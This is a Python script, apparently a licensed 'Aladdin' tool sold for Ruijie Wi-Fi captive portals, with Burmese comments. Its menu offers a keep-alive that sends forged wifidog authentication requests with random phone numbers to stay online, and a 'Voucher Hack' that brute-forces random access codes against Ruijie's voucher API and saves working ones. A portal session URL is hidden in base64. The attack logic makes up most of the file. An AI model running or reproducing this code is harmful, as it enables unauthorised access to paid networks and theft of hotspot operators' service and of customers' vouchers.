import os
import re
import sys
import base64
import random
import string
import time
import asyncio
import aiohttp
import requests
from datetime import datetime

# Colors (Fixed Line 14 - 5 variables, 5 values)
w, g, y, r_clr, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

# [ CONFIGURATION ]
DEFAULT_GATEWAY = "192.168.110.1"
# ဒီအောက်က နေရာမှာ ခင်ဗျားရဲ့ GitHub Raw Link ကို ဖြည့်ပါ
RAW_KEY_LINK = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Aladdin/main/key.txt"

def Logo():
    os.system("clear")
    print(f"""{b}
    ___    __    ___    ____  ____  _____  _   __
   /   |  / /   /   |  / __ \/ __ \/  _/ |/ / / /
  / /| | / /   / /| | / / / / / / // / |   / / / 
 / ___ |/ /___/ ___ |/ /_/ / /_/ // / /   |/_/  
/_/  |_/_____/_/  |_/_____/_____/___//_/|_/(_)  
{g}           [ Ruijie Automation Tool ]{w}""")
    print(f"{y}" + "-"*45 + f"{w}")

# --- [ LICENSE SYSTEM ] ---
def get_device_id():
    try:
        # Serial number ကိုယူပြီး ALD prefix တပ်မယ်
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial or len(serial) < 4:
            serial = "DEV" + "".join(random.choice(string.digits) for _ in range(5))
        return f"ALD-{serial.upper()}"
    except:
        return "ALD-UNKNOWN-ID"

def check_license():
    dev_id = get_device_id()
    cache_file = ".license_cache"
    
    online_data = ""
    # ၁။ Online ကနေ အချက်အလက်ယူပြီး Cache လုပ်မယ်
    try:
        res = requests.get(RAW_KEY_LINK, timeout=7)
        if res.status_code == 200:
            online_data = res.text
            with open(cache_file, "w") as f:
                f.write(online_data)
    except:
        # အင်တာနက်မရှိရင် local သိမ်းထားတာကို ပြန်သုံးမယ်
        if os.path.exists(cache_file):
            online_data = open(cache_file, "r").read()

    # ၂။ Key တိုက်စစ်မယ် (Format: Device ID|Access Key|Expired date)
    if not online_data:
        return False, "No Data"

    for line in online_data.splitlines():
        if "|" in line:
            parts = line.split("|")
            if len(parts) >= 3:
                stored_id = parts[0].strip()
                stored_key = parts[1].strip()
                exp_date = parts[2].strip() # Format: DD/MM/YYYY HH:mm
                
                if stored_id == dev_id:
                    try:
                        exp_dt = datetime.strptime(exp_date, "%d/%m/%Y %H:%M")
                        if datetime.now() < exp_dt:
                            return True, exp_date
                        else:
                            return False, "Expired"
                    except:
                        continue
    return False, "Not Found"

def license_screen():
    dev_id = get_device_id()
    while True:
        Logo()
        print(f"{w}[>] Your Device ID: {y}{dev_id}{w}")
        print(f"{w}[*] Checking License Status...{w}")
        
        status, info = check_license()
        
        if status:
            print(f"{g}[+] Access Granted!{w}")
            print(f"{g}[+] Expired Date: {info}{w}")
            time.sleep(2)
            break
        else:
            if info == "Expired":
                print(f"{r_clr}[!] Your license expired on {info}{w}")
            else:
                print(f"{r_clr}[!] No Valid License Found for this Device.{w}")
            
            print(f"\n{y}[ Contact Admin to get Access Key ]{w}")
            input(f"\n{g}Press Enter to re-check...{w}")

# --- [ TOOL LOGIC ] ---
async def get_session_id(session, session_url):
    if not session_url: return None
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10)'}
    try:
        async with session.get(session_url, headers=headers, timeout=5) as req:
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return match.group(1) if match else None
    except: return None

class AladdinTool:
    def __init__(self):
        # Base64 with Auto-Padding
        raw_url = b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ=='
        missing_padding = len(raw_url) % 4
        if missing_padding: raw_url += b'=' * (4 - missing_padding)
        try:
            self.session_url = base64.b64decode(raw_url).decode('utf-8', errors='ignore')
        except:
            self.session_url = None

        try: self.ip = open(".ip", "r").read().strip()
        except: self.ip = DEFAULT_GATEWAY

    async def keep_alive(self):
        Logo()
        print(f"{g}[+] Internet Keep-Alive Running... (Ctrl+C to stop)")
        async with aiohttp.ClientSession() as session:
            session_id = None
            while True:
                if not session_id:
                    session_id = await get_session_id(session, self.session_url)
                if session_id:
                    params = {'token': session_id, 'phoneNumber': '09'+''.join(random.choice(string.digits) for _ in range(8))}
                    try:
                        async with session.post(f"http://{self.ip}:2060/wifidog/auth?", params=params, timeout=5) as res:
                            print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {res.status} - Online")
                    except: session_id = None
                await asyncio.sleep(3)

    async def voucher_hack(self, mode, length):
        Logo()
        print(f"{g}[+] Hacking {length}-{mode}... (Ctrl+C to stop)")
        async with aiohttp.ClientSession() as session:
            session_id = None
            while True:
                if not session_id:
                    session_id = await get_session_id(session, self.session_url)
                if session_id:
                    if mode == "digit":
                        code = "".join(random.choice(string.digits) for _ in range(length))
                    elif mode == "lower":
                        code = "".join(random.choice(string.ascii_lowercase) for _ in range(length))
                    elif mode == "upper":
                        code = "".join(random.choice(string.ascii_uppercase) for _ in range(length))

                    data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1}
                    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
                    try:
                        async with session.post(url, json=data, timeout=5) as req:
                            res = await req.json()
                            if 'logonUrl' in str(res):
                                print(f"\n{g}[SUCCESS] Found: {code}{w}")
                                with open("success.txt", "a") as f: f.write(f"{code}\n")
                            else:
                                print(f"{w}[TRYING] {code}", end='\r')
                    except: pass
                await asyncio.sleep(0.1)

def setup_process():
    Logo()
    print(f"{y}[*] Detecting Network...{w}")
    try:
        r = requests.get(f"http://{DEFAULT_GATEWAY}", timeout=5)
        match = re.search('gw_address=(.*?)&', r.url)
        if match:
            ip = match.group(1)
            open(".ip", "w").write(ip)
            print(f"{g}[+] Setup Success! IP: {ip}{w}")
        else:
            open(".ip", "w").write(DEFAULT_GATEWAY)
            print(f"{g}[+] Setup Success! (Default IP: {DEFAULT_GATEWAY}){w}")
    except:
        print(f"{r_clr}[!] Connection Failed! Check WiFi connectivity.{w}")
    time.sleep(2)

def main():
    # ၁။ License အရင်စစ်မယ်
    license_screen()
    
    # ၂။ အောင်မြင်မှ Menu ပြမယ်
    while True:
        tool = AladdinTool()
        Logo()
        print(f"{w}[1] Start Setup")
        print(f"{w}[2] Internet Keep-Alive")
        print(f"{w}[3] Voucher Hack (Choice)")
        print(f"{r_clr}[0] Exit")
        choice = input(f"\n{y}Select > {w}")

        if choice == '1':
            setup_process()
        elif choice == '2':
            try: asyncio.run(tool.keep_alive())
            except KeyboardInterrupt: pass
        elif choice == '3':
            Logo()
            print("[1] 6 Digits\n[2] 6 Letters (abc)\n[3] 6 Letters (ABC)\n[4] 7 Digits\n[5] 8 Digits")
            v_choice = input(f"\n{y}Choose Mode > {w}")
            config = {'1': ('digit', 6), '2': ('lower', 6), '3': ('upper', 6), '4': ('digit', 7), '5': ('digit', 8)}
            if v_choice in config:
                try: asyncio.run(tool.voucher_hack(*config[v_choice]))
                except KeyboardInterrupt: pass
        elif choice == '0':
            break

if __name__ == "__main__":
    main()
        
